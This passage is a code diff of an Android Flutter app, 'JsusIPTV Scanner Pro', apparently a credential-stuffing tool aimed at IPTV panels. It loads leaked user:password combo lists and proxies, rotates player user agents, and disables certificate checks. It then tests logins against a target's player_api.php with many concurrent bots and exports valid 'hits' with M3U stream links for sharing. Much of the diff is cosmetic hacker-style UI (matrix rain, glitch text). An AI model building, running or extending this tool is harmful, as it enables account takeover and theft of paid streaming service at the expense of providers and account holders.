@@ -16,10 +16,11 @@ const cCy = Color(0xFF00E5FF);
 const cYe = Color(0xFFFFD600);
 const cRe = Color(0xFFFF1744);
 const cMg = Color(0xFFE040FB);
-const cDg = Color(0xFF3A6B3A);
-const cBg = Color(0xFF010301);
-const cBg2 = Color(0xFF030803);
+const cDg = Color(0xFF2A5A2A);
+const cBg = Color(0xFF000800);
+const cBg2 = Color(0xFF010C01);
 const cBr = Color(0xFF0A1F0A);
+const cOr = Color(0xFFFF6D00);
 
 class ComboItem {
   final String user, pass;
@@ -35,56 +36,30 @@ class HitItem {
   final String username, password, panel, expira, status, conex, activ, m3u, timezone;
   PanelInfo? panelInfo;
   final String id;
+  final DateTime foundAt;
   HitItem({
     required this.username, required this.password, required this.panel,
     required this.expira, required this.status, required this.conex,
     required this.activ, required this.m3u, required this.timezone,
-  }) : id = DateTime.now().millisecondsSinceEpoch.toString();
+  }) : id = DateTime.now().millisecondsSinceEpoch.toString(),
+       foundAt = DateTime.now();
 }
 
 final _client = HttpClient()..badCertificateCallback = (_, __, ___) => true;
 
-// ═══ PARSER ROBUSTO ═══
 List<ComboItem> parseCombo(String text) {
   final lines = <ComboItem>[];
   final seen = <String>{};
-  
-  // Limpiar BOM y normalizar saltos de línea
-  final clean = text
-    .replaceAll('\uFEFF', '')
-    .replaceAll('\r\n', '\n')
-    .replaceAll('\r', '\n');
-  
+  final clean = text.replaceAll('\uFEFF','').replaceAll('\r\n','\n').replaceAll('\r','\n');
   for (final raw in clean.split('\n')) {
-    // Limpiar espacios y caracteres invisibles
-    final line = raw.trim()
-      .replaceAll('\t', '')
-      .replaceAll('\u0000', '')
-      .replaceAll('\u00a0', '');
-    
-    // Saltar vacíos y comentarios
-    if (line.isEmpty) continue;
-    if (line.startsWith('#')) continue;
-    if (line.startsWith('//')) continue;
-    if (line.startsWith(';')) continue;
-    
-    // Debe tener ":"
+    final line = raw.trim().replaceAll('\t','').replaceAll('\u0000','');
+    if (line.isEmpty || line.startsWith('#') || line.startsWith('//')) continue;
     if (!line.contains(':')) continue;
-    
-    // Separar solo en el primer ":"
     final idx = line.indexOf(':');
     final user = line.substring(0, idx).trim();
     final pass = line.substring(idx + 1).trim();
-    
-    // Validar que no estén vacíos
     if (user.isEmpty || pass.isEmpty) continue;
-    
-    // Ignorar URLs
     if (user.toLowerCase().startsWith('http')) continue;
-    if (user.toLowerCase().startsWith('www')) continue;
-    if (user.contains('@')) continue;
-    
-    // Deduplicar
     final key = '${user.toLowerCase()}:$pass';
     if (seen.contains(key)) continue;
     seen.add(key);
@@ -103,10 +78,9 @@ Future<Map<String, dynamic>?> checkAcc(String panel, String user, String pass, i
     final res = await req.close().timeout(Duration(seconds: tout));
     if (res.statusCode >= 500) return null;
     final body = await res.transform(utf8.decoder).join();
-    try {
-      return jsonDecode(body) as Map<String, dynamic>;
-    } catch (_) {
-      if (body.contains('"auth":1') || body.contains('"status":"Active"') || body.contains('"status":"active"')) {
+    try { return jsonDecode(body) as Map<String, dynamic>; }
+    catch (_) {
+      if (body.contains('"auth":1') || body.contains('"status":"Active"')) {
         return {'user_info': {'auth': 1, 'status': 'Active'}, 'server_info': {}};
       }
       return null;
@@ -139,50 +113,63 @@ Future<int> _cnt(String panel, String user, String pass, String action) async {
 }
 
 const _uas = [
-  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36',
-  'Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 Chrome/119.0',
+  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0',
   'VLC/3.0.20 LibVLC/3.0.20', 'TiviMate/4.7.0', 'IPTVSmarters/3.1.5',
   'okhttp/4.12.0', 'ExoPlayer/2.19.1', 'Dalvik/2.1.0 (Linux; U; Android 13)',
-  'Kodi/20.2 (Linux; Android 12.0)', 'IPTV Smarters Pro/3.0.9.5',
 ];
 String _ua() => _uas[DateTime.now().millisecondsSinceEpoch % _uas.length];
 
 // ═══ MATRIX PAINTER ═══
 class MatrixPainter extends CustomPainter {
-  final double progress;
-  final List<List<int>> drops;
+  final List<List<double>> drops;
   final List<List<String>> chars;
-  static const _chars = '0123456789ABCDEF日月火水木金土アイウエオカキクケコ';
-  final _rnd = Random();
-
-  MatrixPainter(this.progress, this.drops, this.chars);
+  static const ch = '01アイウエオABCDEF日月火水木金<>{}[]|\\/*&^%#@!';
+  MatrixPainter(this.drops, this.chars);
 
   @override
   void paint(Canvas canvas, Size size) {
-    final cols = (size.width / 14).floor();
-    final rows = (size.height / 14).floor();
-    final paint = Paint();
-
-    for (var c = 0; c < min(cols, drops.length); c++) {
-      for (var r = 0; r < min(rows, drops[c].length); r++) {
-        final age = drops[c][r];
-        if (age <= 0) continue;
-        final opacity = (age / 20.0).clamp(0.0, 1.0);
-        paint.color = (r == drops[c].length - 1
-          ? Colors.white
-          : cG).withOpacity(opacity * 0.4);
-        final ch = chars[c][r];
+    final cols = drops.length;
+    final rows = drops[0].length;
+    for (var c = 0; c < cols; c++) {
+      for (var r = 0; r < rows; r++) {
+        final a = drops[c][r];
+        if (a <= 0) continue;
+        final isHead = r > 0 && drops[c][r-1] <= 0 && a > 0.8;
+        final color = isHead
+          ? Colors.white.withOpacity(a * 0.9)
+          : cG.withOpacity(a * 0.35);
         final tp = TextPainter(
-          text: TextSpan(text: ch, style: TextStyle(color: paint.color, fontSize: 11, fontFamily: 'monospace')),
+          text: TextSpan(text: chars[c][r],
+            style: TextStyle(color: color, fontSize: 11,
+              fontFamily: 'monospace',
+              fontWeight: isHead ? FontWeight.bold : FontWeight.normal)),
           textDirection: TextDirection.ltr,
         )..layout();
-        tp.paint(canvas, Offset(c * 14.0, r * 14.0));
+        tp.paint(canvas, Offset(c * 13.0, r * 13.0));
       }
     }
   }
 
   @override
   bool shouldRepaint(MatrixPainter old) => true;
+}
+
+// ═══ GRID PAINTER ═══
+class GridPainter extends CustomPainter {
+  @override
+  void paint(Canvas canvas, Size size) {
+    final paint = Paint()
+      ..color = cG.withOpacity(0.03)
+      ..strokeWidth = 0.5;
+    for (var x = 0.0; x < size.width; x += 30) {
+      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
+    }
+    for (var y = 0.0; y < size.height; y += 30) {
+      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
+    }
+  }
+  @override
+  bool shouldRepaint(GridPainter old) => false;
 }
 
 class JsusApp extends StatelessWidget {
@@ -223,98 +210,115 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
   int _checked = 0, _hn = 0, _fails = 0, _bans = 0, _total = 0;
   int _bots = 20, _tout = 10;
   DateTime? _t0;
-  Timer? _timer;
-  Timer? _matrixTimer;
+  Timer? _timer, _matTimer, _glitchTimer;
   final _srvCtrl = TextEditingController();
-
-  late AnimationController _glowAc;
-  late Animation<double> _glow;
-  late AnimationController _pulseAc;
-  late Animation<double> _pulse;
-  late AnimationController _scanLineAc;
-  late Animation<double> _scanLine;
-
-  // Matrix
-  List<List<int>> _drops = [];
-  List<List<String>> _chars = [];
   final _rnd = Random();
-  static const _matChars = '0123456789ABCDEFアイウエオカキクケコ';
+  bool _glitching = false;
+  String _glitchText = 'JsusIPTV Scanner';
+
+  // Matrix state
+  List<List<double>> _drops = [];
+  List<List<String>> _chars = [];
+  static const _mch = '01アイウエオABCDEF日月火水<>{}[]|/*&^%#@!';
+
+  // Animations
+  late AnimationController _glowAc, _pulseAc, _scanAc, _hitAc;
+  late Animation<double> _glow, _pulse, _scan, _hitFlash;
 
   @override
   void initState() {
     super.initState();
     _glowAc = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
-    _glow = Tween<double>(begin: 0.3, end: 1.0).animate(CurvedAnimation(parent: _glowAc, curve: Curves.easeInOut));
+    _glow = Tween<double>(begin: 0.4, end: 1.0).animate(CurvedAnimation(parent: _glowAc, curve: Curves.easeInOut));
 
-    _pulseAc = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..repeat(reverse: true);
-    _pulse = Tween<double>(begin: 0.4, end: 1.0).animate(CurvedAnimation(parent: _pulseAc, curve: Curves.easeInOut));
+    _pulseAc = AnimationController(vsync: this, duration: const Duration(milliseconds: 600))..repeat(reverse: true);
+    _pulse = Tween<double>(begin: 0.3, end: 1.0).animate(CurvedAnimation(parent: _pulseAc, curve: Curves.easeInOut));
 
-    _scanLineAc = AnimationController(vsync: this, duration: const Duration(seconds: 3))..repeat();
-    _scanLine = Tween<double>(begin: 0.0, end: 1.0).animate(_scanLineAc);
+    _scanAc = AnimationController(vsync: this, duration: const Duration(seconds: 4))..repeat();
+    _scan = Tween<double>(begin: 0.0, end: 1.0).animate(_scanAc);
 
-    _initMatrix(30, 60);
-    _matrixTimer = Timer.periodic(const Duration(milliseconds: 80), (_) => _tickMatrix());
+    _hitAc = AnimationController(vsync: this, duration: const Duration(milliseconds: 300));
+    _hitFlash = Tween<double>(begin: 0.0, end: 1.0).animate(_hitAc);
+
+    _initMatrix();
+    _matTimer = Timer.periodic(const Duration(milliseconds: 60), (_) => _tickMatrix());
+
+    // Glitch effect
+    _glitchTimer = Timer.periodic(const Duration(seconds: 8), (_) => _triggerGlitch());
   }
 
-  void _initMatrix(int cols, int rows) {
-    _drops = List.generate(cols, (_) => List.generate(rows, (r) => _rnd.nextInt(20) - 20));
-    _chars = List.generate(cols, (_) => List.generate(rows, (_) => _matChars[_rnd.nextInt(_matChars.length)]));
+  void _initMatrix() {
+    const cols = 32, rows = 55;
+    _drops = List.generate(cols, (_) => List.generate(rows, (r) => _rnd.nextDouble() > 0.9 ? _rnd.nextDouble() : 0.0));
+    _chars = List.generate(cols, (_) => List.generate(rows, (_) => _mch[_rnd.nextInt(_mch.length)]));
   }
 
   void _tickMatrix() {
     if (!mounted) return;
     setState(() {
       for (var c = 0; c < _drops.length; c++) {
-        for (var r = _drops[c].length - 1; r >= 0; r--) {
+        // Random new drops
+        if (_rnd.nextDouble() < 0.03) _drops[c][0] = 1.0;
+        // Cascade down
+        for (var r = _drops[c].length - 1; r > 0; r--) {
+          if (_drops[c][r-1] > 0.5 && _drops[c][r] < 0.1) {
+            _drops[c][r] = _drops[c][r-1] * 0.95;
+          }
           if (_drops[c][r] > 0) {
-            _drops[c][r]--;
-            if (_rnd.nextDouble() < 0.1) {
-              _chars[c][r] = _matChars[_rnd.nextInt(_matChars.length)];
+            _drops[c][r] -= 0.015;
+            if (_rnd.nextDouble() < 0.08) {
+              _chars[c][r] = _mch[_rnd.nextInt(_mch.length)];
             }
           }
         }
-        // New drop
-        if (_rnd.nextDouble() < 0.05) {
-          _drops[c][0] = 20;
-          _chars[c][0] = _matChars[_rnd.nextInt(_matChars.length)];
-        }
-        // Cascade
-        for (var r = _drops[c].length - 1; r > 0; r--) {
-          if (_drops[c][r - 1] == 20 && _drops[c][r] == 0) {
-            _drops[c][r] = 18;
-            _chars[c][r] = _matChars[_rnd.nextInt(_matChars.length)];
-          }
-        }
+        _drops[c][0] *= 0.92;
       }
+    });
+  }
+
+  void _triggerGlitch() {
+    if (!mounted || _glitching) return;
+    setState(() => _glitching = true);
+    const chars = '!@#\$%^&*<>?/\\|{}[]';
+    int count = 0;
+    Timer.periodic(const Duration(milliseconds: 50), (t) {
+      if (!mounted) { t.cancel(); return; }
+      setState(() {
+        _glitchText = count < 8
+          ? List.generate('JsusIPTV Scanner'.length, (i) =>
+              _rnd.nextDouble() < 0.3 ? chars[_rnd.nextInt(chars.length)] : 'JsusIPTV Scanner'[i]).join()
+          : 'JsusIPTV Scanner';
+      });
+      count++;
+      if (count >= 10) { t.cancel(); setState(() => _glitching = false); }
     });
   }
 
   @override
   void dispose() {
-    _glowAc.dispose(); _pulseAc.dispose(); _scanLineAc.dispose();
-    _timer?.cancel(); _matrixTimer?.cancel();
+    _glowAc.dispose(); _pulseAc.dispose(); _scanAc.dispose(); _hitAc.dispose();
+    _timer?.cancel(); _matTimer?.cancel(); _glitchTimer?.cancel();
     super.dispose();
   }
 
   void _log(String m) {
     if (!mounted) return;
     setState(() {
-      _logs.add('[${TimeOfDay.now().format(context)}] $m');
+      _logs.insert(0, m);
       if (_logs.length > 200) _logs.removeLast();
     });
   }
 
   void _toast(String m) => ScaffoldMessenger.of(context).showSnackBar(SnackBar(
     content: Row(children: [
-      const Icon(Icons.terminal, color: cG, size: 14),
-      const SizedBox(width: 8),
-      Text(m, style: const TextStyle(color: cG, fontSize: 12, letterSpacing: 1)),
+      const Text('> ', style: TextStyle(color: cG, fontFamily: 'monospace', fontWeight: FontWeight.bold)),
+      Text(m, style: const TextStyle(color: cG, fontSize: 12, fontFamily: 'monospace')),
     ]),
-    backgroundColor: const Color(0xFF050F05),
+    backgroundColor: const Color(0xFF010C01),
     duration: const Duration(seconds: 2),
     behavior: SnackBarBehavior.floating,
     shape: RoundedRectangleBorder(
-      borderRadius: BorderRadius.circular(4),
+      borderRadius: BorderRadius.circular(2),
       side: const BorderSide(color: cG, width: 1),
     ),
   ));
@@ -322,12 +326,12 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
   Future<void> _loadCombo() async {
     final r = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['txt']);
     if (r == null) return;
-    final file = File(r.files.single.path!);
-    final text = await file.readAsString();
+    final text = await File(r.files.single.path!).readAsString();
     final parsed = parseCombo(text);
     setState(() { _combo.clear(); _combo.addAll(parsed); _cname = r.files.single.name; });
-    _log('COMBO: ${r.files.single.name} — ${parsed.length} únicos de ${text.split('\n').length} líneas');
-    _toast('✓ ${_fmt(parsed.length)} combos listos');
+    _log('[+] COMBO: ${r.files.single.name}');
+    _log('[+] ${_fmt(parsed.length)} líneas únicas cargadas');
+    _toast('${_fmt(parsed.length)} combos listos');
   }
 
   Future<void> _loadProxies() async {
@@ -336,50 +340,55 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
     final text = await File(r.files.single.path!).readAsString();
     final lines = text.split('\n').map((l) => l.trim()).where((l) => l.isNotEmpty && l.contains(':')).toList();
     setState(() { _proxies.clear(); _proxies.addAll(lines); });
-    _toast('✓ ${lines.length} proxies');
+    _log('[+] PROXIES: ${lines.length} cargados');
+    _toast('${lines.length} proxies');
   }
 
   void _addSrv() {
     var url = _srvCtrl.text.trim();
-    if (url.isEmpty) { _toast('⚠ Ingresa URL'); return; }
+    if (url.isEmpty) { _toast('ERROR: Ingresa URL'); return; }
     if (!url.startsWith('http')) url = 'http://$url';
     url = url.replaceAll(RegExp(r'/+$'), '');
-    if (_srvs.contains(url)) { _toast('Ya existe'); return; }
+    if (_srvs.contains(url)) { _toast('ERROR: Ya existe'); return; }
     setState(() { _srvs.add(url); _srv = url; });
     _srvCtrl.clear();
-    _toast('✓ Agregado');
     _verifySrv(url);
   }
 
   Future<void> _verifySrv(String url) async {
-    _log('SRV: Verificando $url...');
+    _log('[*] Verificando: $url');
     try {
       final req = await _client.getUrl(Uri.parse('$url/player_api.php?username=test&password=test'));
       req.headers.set('User-Agent', _ua());
       final res = await req.close().timeout(const Duration(seconds: 6));
       if (res.statusCode < 500) {
-        _log('SRV: ✓ ACTIVO (${res.statusCode}) — $url');
-        _toast('✓ Servidor activo');
+        _log('[+] ACTIVO (${res.statusCode}) >> $url');
+        _toast('SERVIDOR ACTIVO');
       } else {
-        _log('SRV: ⚠ Responde con error ${res.statusCode}');
+        _log('[!] ERROR ${res.statusCode} >> $url');
       }
     } catch (_) {
-      _log('SRV: ✗ Sin respuesta — agregado de todas formas');
-      _toast('⚠ Sin respuesta — agregado');
+      _log('[-] SIN RESPUESTA >> $url');
+      _toast('SIN RESPUESTA - AGREGADO');
     }
   }
 
   Future<void> _startScan() async {
-    if (_srv == null) { _toast('⚠ Configura servidor'); return; }
-    if (_combo.isEmpty) { _toast('⚠ Carga combo'); return; }
+    if (_srv == null) { _toast('ERROR: Sin servidor'); return; }
+    if (_combo.isEmpty) { _toast('ERROR: Sin combo'); return; }
     setState(() {
       _scanning = true; _paused = false;
       _checked = 0; _hn = 0; _fails = 0; _bans = 0;
       _total = _combo.length; _t0 = DateTime.now();
     });
-    _log('▶ SCAN INICIADO — ${_fmt(_total)} combos — $_bots bots');
-    _log('SRV: $_srv');
-    _timer = Timer.periodic(const Duration(milliseconds: 300), (_) { if (mounted) setState(() {}); });
+    _log('');
+    _log('═══════════════════════════════');
+    _log('[*] INICIANDO ATAQUE...');
+    _log('[*] TARGET: $_srv');
+    _log('[*] COMBO: ${_fmt(_total)} líneas');
+    _log('[*] BOTS: $_bots | TIMEOUT: ${_tout}s');
+    _log('═══════════════════════════════');
+    _timer = Timer.periodic(const Duration(milliseconds: 250), (_) { if (mounted) setState(() {}); });
     final q = List<ComboItem>.from(_combo)..shuffle();
     await _runScan(q);
   }
@@ -392,42 +401,37 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
     Future<void> work(ComboItem item) async {
       while (_paused && _scanning) await Future.delayed(const Duration(milliseconds: 100));
       if (!_scanning) { active--; chk(); return; }
-
       final data = await checkAcc(_srv!, item.user, item.pass, _tout);
       if (mounted) setState(() => _checked++);
-
       if (data != null) {
         final ui = (data['user_info'] as Map?) ?? {};
         final si = (data['server_info'] as Map?) ?? {};
         final auth = ui['auth'];
         final st = ui['status']?.toString().toLowerCase().trim() ?? '';
         final ok = auth == 1 || auth == '1' || auth == true ||
-          ['active','activo','enabled','1','premium','trial','free','Active'].contains(st) ||
-          ui['auth'].toString() == '1';
-
-        if (ok && st != 'banned' && st != 'disabled' && st != 'expired') {
+          ['active','activo','enabled','1','premium','trial','free'].contains(st);
+        if (ok && st != 'banned' && st != 'disabled') {
           String exp = 'Ilimitado';
           final ts = ui['exp_date'];
           if (ts != null) {
             final n = int.tryParse(ts.toString());
-            if (n != null && n > 0) {
-              exp = DateTime.fromMillisecondsSinceEpoch(n * 1000).toString().split(' ')[0];
-            }
+            if (n != null && n > 0) exp = DateTime.fromMillisecondsSinceEpoch(n * 1000).toString().split(' ')[0];
           }
           final hit = HitItem(
             username: item.user, password: item.pass, panel: _srv!,
-            expira: exp,
-            status: ui['status']?.toString() ?? 'Active',
+            expira: exp, status: ui['status']?.toString() ?? 'Active',
             conex: ui['max_connections']?.toString() ?? '?',
             activ: ui['active_cons']?.toString() ?? '0',
             m3u: '$_srv/get.php?username=${Uri.encodeComponent(item.user)}&password=${Uri.encodeComponent(item.pass)}&type=m3u_plus',
             timezone: si['timezone']?.toString() ?? '',
           );
           if (mounted) setState(() { _hits.insert(0, hit); _hn++; });
-          _log('🎯 HIT #$_hn: ${item.user} → EXP: $exp');
+          _log('[HIT] #$_hn >> ${item.user}:${item.pass}');
+          _log('      EXP: $exp | CONEX: ${hit.activ}/${hit.conex}');
+          _hitAc.forward(from: 0);
           verifyPanel(_srv!, item.user, item.pass).then((info) {
             if (mounted) setState(() => hit.panelInfo = info);
-            _log('📊 PANEL: ${item.user} 📺${info.live} 🎬${info.vod} 📺${info.series}');
+            _log('      TV:${info.live} VOD:${info.vod} SER:${info.series}');
           });
         } else {
           if (mounted) setState(() => _fails++);
@@ -435,57 +439,57 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
       } else {
         if (mounted) setState(() => _fails++);
       }
-
       final br = _bans / (_checked > 0 ? _checked : 1);
-      await Future.delayed(Duration(milliseconds: br > 0.3 ? 200 : br > 0.1 ? 60 : 5));
+      await Future.delayed(Duration(milliseconds: br > 0.3 ? 150 : br > 0.1 ? 50 : 5));
       active--; chk();
     }
 
     while (pos < q.length && _scanning) {
       if (active < _bots && !_paused) { active++; work(q[pos++]); }
-      else await Future.delayed(const Duration(milliseconds: 15));
+      else await Future.delayed(const Duration(milliseconds: 10));
     }
-
     await done.future.timeout(const Duration(hours: 24), onTimeout: () {});
     _timer?.cancel();
     if (mounted) setState(() => _scanning = false);
-    _log('✓ FIN — Hits: $_hn | Fail: $_fails | Bans: $_bans');
-    _toast('✓ Finalizado — $_hn HITs');
+    _log('');
+    _log('═══════════════════════════════');
+    _log('[*] SCAN COMPLETADO');
+    _log('[+] HITS: $_hn | FAIL: $_fails | BANS: $_bans');
+    _log('═══════════════════════════════');
+    _toast('COMPLETADO >> $_hn HITS');
   }
 
   Future<void> _export() async {
-    if (_hits.isEmpty) { _toast('No hay hits'); return; }
+    if (_hits.isEmpty) { _toast('ERROR: Sin hits'); return; }
     final sep = '=' * 56;
-    final buf = StringBuffer('JsusIPTV Scanner Pro — HITS\n$sep\n\n');
+    final buf = StringBuffer('JsusIPTV Scanner Pro\n$sep\n\n');
     for (var i = 0; i < _hits.length; i++) {
       final h = _hits[i];
-      buf.writeln('HIT #${i + 1}');
+      buf.writeln('[HIT #${i+1}]');
       buf.writeln('USER   : ${h.username}');
       buf.writeln('PASS   : ${h.password}');
       buf.writeln('SERVER : ${h.panel}');
       buf.writeln('EXPIRA : ${h.expira}');
       buf.writeln('CONEX  : ${h.activ}/${h.conex}');
-      buf.writeln('ESTADO : ${h.status}');
-      if (h.timezone.isNotEmpty) buf.writeln('ZONA   : ${h.timezone}');
       if (h.panelInfo != null) {
         buf.writeln('CANALES: ${h.panelInfo!.live}');
         buf.writeln('VOD    : ${h.panelInfo!.vod}');
         buf.writeln('SERIES : ${h.panelInfo!.series}');
       }
       buf.writeln('M3U    : ${h.m3u}');
-      buf.writeln('${'─' * 40}\n');
+      buf.writeln('${'─'*40}\n');
     }
     final dir = await getExternalStorageDirectory();
     final file = File('${dir!.path}/JsusIPTV_${DateTime.now().toIso8601String().split('T')[0]}.txt');
     await file.writeAsString(buf.toString());
     await Share.shareXFiles([XFile(file.path)]);
-    _toast('✓ ${_hits.length} hits exportados');
+    _toast('EXPORTADO >> ${_hits.length} hits');
   }
 
   String get _elapsed {
     if (_t0 == null) return '00:00:00';
     final d = DateTime.now().difference(_t0!);
-    return '${d.inHours.toString().padLeft(2, '0')}:${(d.inMinutes % 60).toString().padLeft(2, '0')}:${(d.inSeconds % 60).toString().padLeft(2, '0')}';
+    return '${d.inHours.toString().padLeft(2,'0')}:${(d.inMinutes%60).toString().padLeft(2,'0')}:${(d.inSeconds%60).toString().padLeft(2,'0')}';
   }
 
   int get _cpm {
@@ -506,40 +510,29 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
     return buf.toString();
   }
 
-  String _fn(int n) => n >= 1000 ? '${(n / 1000).toStringAsFixed(1)}k' : '$n';
-
-  Color _lc(String l) {
-    if (l.contains('HIT') || l.contains('🎯')) return cG;
-    if (l.contains('FAIL') || l.contains('✗')) return cRe;
-    if (l.contains('WARN') || l.contains('PAUS') || l.contains('⚠')) return cYe;
-    if (l.contains('PANEL') || l.contains('SRV') || l.contains('📊')) return cCy;
-    if (l.contains('FIN') || l.contains('✓')) return cG;
-    return cDg;
-  }
+  String _fn(int n) => n >= 1000 ? '${(n/1000).toStringAsFixed(1)}k' : '$n';
 
   @override
   Widget build(BuildContext context) => Scaffold(
     backgroundColor: cBg,
     body: Stack(children: [
-      // Matrix background
-      Positioned.fill(child: CustomPaint(
-        painter: MatrixPainter(_scanLine.value, _drops, _chars),
+      // Grid background
+      Positioned.fill(child: CustomPaint(painter: GridPainter())),
+      // Matrix
+      Positioned.fill(child: CustomPaint(painter: MatrixPainter(_drops, _chars))),
+      // Scan line
+      Positioned.fill(child: AnimatedBuilder(
+        animation: _scan,
+        builder: (_, __) => CustomPaint(painter: _ScanLinePainter(_scan.value)),
       )),
       // Vignette
       Positioned.fill(child: Container(
-        decoration: const BoxDecoration(
-          gradient: RadialGradient(
-            center: Alignment.center, radius: 1.2,
-            colors: [Colors.transparent, Color(0xCC000000)],
-          ),
-        ),
+        decoration: BoxDecoration(gradient: RadialGradient(
+          center: Alignment.center, radius: 1.1,
+          colors: [Colors.transparent, cBg.withOpacity(0.7)],
+        )),
       )),
-      // Scanline overlay
-      Positioned.fill(child: AnimatedBuilder(
-        animation: _scanLine,
-        builder: (_, __) => CustomPaint(painter: _ScanLinePainter(_scanLine.value)),
-      )),
-      // Content
+      // Main content
       SafeArea(child: Column(children: [
         _hdr(), _nav(),
         Expanded(child: _body()),
@@ -548,100 +541,133 @@ class _HS extends State<HomeScreen> with TickerProviderStateMixin {
   );
 
   Widget _hdr() => Container(
-    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
+    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
     decoration: BoxDecoration(
-      color: cBg2.withOpacity(0.92),
-      border: Border(bottom: BorderSide(color: cBr)),
-      boxShadow: [BoxShadow(color: cG.withOpacity(0.05), blurRadius: 20, spreadRadius: -5)],
+      color: cBg2.withOpacity(0.95),
+      border: Border(
+        bottom: BorderSide(color: cG.withOpacity(0.3)),
+        top: BorderSide(color: cG.withOpacity(0.1)),
+      ),
     ),
     child: Row(children: [
-      // Icon with glow
+      // Logo
       AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
-        width: 42, height: 42,
+        width: 44, height: 44,
         decoration: BoxDecoration(
-          borderRadius: BorderRadius.circular(10),
-          border: Border.all(color: cG.withOpacity(0.4), width: 1.5),
-          boxShadow: [BoxShadow(color: cG.withOpacity(_glow.value * 0.3), blurRadius: 15, spreadRadius: 1)],
+          borderRadius: BorderRadius.circular(4),
+          border: Border.all(color: cG.withOpacity(0.5), width: 1),
+          boxShadow: [
+            BoxShadow(color: cG.withOpacity(_glow.value * 0.4), blurRadius: 15, spreadRadius: 2),
+            BoxShadow(color: cCy.withOpacity(_glow.value * 0.2), blurRadius: 25),
+          ],
         ),
         child: ClipRRect(
-          borderRadius: BorderRadius.circular(9),
+          borderRadius: BorderRadius.circular(3),
           child: Image.asset('android-icon/icon.png',
             errorBuilder: (_, __, ___) => Container(
               color: cBg2,
-              child: const Center(child: Text('Js', style: TextStyle(color: cG, fontSize: 14, fontWeight: FontWeight.bold))),
-            )),
+              child: const Center(child: Text('Js',
+                style: TextStyle(color: cG, fontSize: 14, fontWeight: FontWeight.bold))))),
         ),
       )),
-      const SizedBox(width: 12),
+      const SizedBox(width: 10),
       Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        AnimatedBuilder(animation: _glow, builder: (_, __) => ShaderMask(
-          shaderCallback: (bounds) => LinearGradient(colors: [cCy, cG, cCy]).createShader(bounds),
-          child: const Text('JsusIPTV Scanner', style: TextStyle(
-            fontSize: 17, fontWeight: FontWeight.bold, letterSpacing: 1.5,
-            color: Colors.white,
-          )),
+        AnimatedBuilder(animation: _glow, builder: (_, __) => Text(
+          _glitchText,
+          style: TextStyle(
+            fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 2,
+            fontFamily: 'monospace',
+            foreground: Paint()..shader = LinearGradient(
+              colors: [cG, cCy, cG],
+              stops: const [0.0, 0.5, 1.0],
+            ).createShader(const Rect.fromLTWH(0, 0, 200, 20)),
+            shadows: [
+              Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15),
+              Shadow(color: cCy.withOpacity(_glow.value * 0.5), blurRadius: 25),
+            ],
+          ),
         )),
-        Text('PRO v5.0  ·  POTENCIA  ·  PRECISION  ·  VELOCIDAD',
-          style: TextStyle(fontSize: 7.5, color: cDg.withOpacity(0.8), letterSpacing: 1.5)),
+        Row(children: [
+          Text('PRO v5.0', style: TextStyle(fontSize: 8, color: cG.withOpacity(0.5), letterSpacing: 2)),
+          const SizedBox(width: 8),
+          Text('POTENCIA · PRECISION · VELOCIDAD',
+            style: TextStyle(fontSize: 7, color: cDg.withOpacity(0.8), letterSpacing: 1)),
+        ]),
       ])),
+      // Status
       Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
         AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
-          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
+          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
           decoration: BoxDecoration(
             color: (_scanning ? cG : cRe).withOpacity(0.08),
-            borderRadius: BorderRadius.circular(20),
-            border: Border.all(color: (_scanning ? cG : cRe).withOpacity(0.4)),
+            borderRadius: BorderRadius.circular(2),
+            border: Border.all(color: (_scanning ? cG : cRe).withOpacity(0.5)),
             boxShadow: [BoxShadow(
-              color: (_scanning ? cG : cRe).withOpacity(_scanning ? _pulse.value * 0.3 : 0.1),
-              blurRadius: 10,
+              color: (_scanning ? cG : cRe).withOpacity(_scanning ? _pulse.value * 0.4 : 0.15),
+              blurRadius: 12, spreadRadius: 1,
             )],
           ),
           child: Row(mainAxisSize: MainAxisSize.min, children: [
             Container(width: 6, height: 6, decoration: BoxDecoration(
               shape: BoxShape.circle,
               color: _scanning ? cG : cRe,
-              boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_pulse.value), blurRadius: 6)],
+              boxShadow: [BoxShadow(
+                color: (_scanning ? cG : cRe).withOpacity(_pulse.value),
+                blurRadius: 8,
+              )],
             )),
             const SizedBox(width: 5),
-            Text(_scanning ? 'SCAN' : 'IDLE',
-              style: TextStyle(fontSize: 9, color: _scanning ? cG : cRe, letterSpacing: 1.5, fontWeight: FontWeight.bold)),
+            Text(_scanning ? 'ONLINE' : 'IDLE',
+              style: TextStyle(
+                fontSize: 9, letterSpacing: 2, fontWeight: FontWeight.bold,
+                color: _scanning ? cG : cRe,
+                shadows: [Shadow(color: (_scanning ? cG : cRe).withOpacity(0.8), blurRadius: 8)],
+              )),
           ]),
         )),
         const SizedBox(height: 3),
         StreamBuilder(
           stream: Stream.periodic(const Duration(seconds: 1)),
-          builder: (_, __) => Text(TimeOfDay.now().format(context),
-            style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.8), letterSpacing: 1)),
+          builder: (_, __) => Text(
+            TimeOfDay.now().format(context),
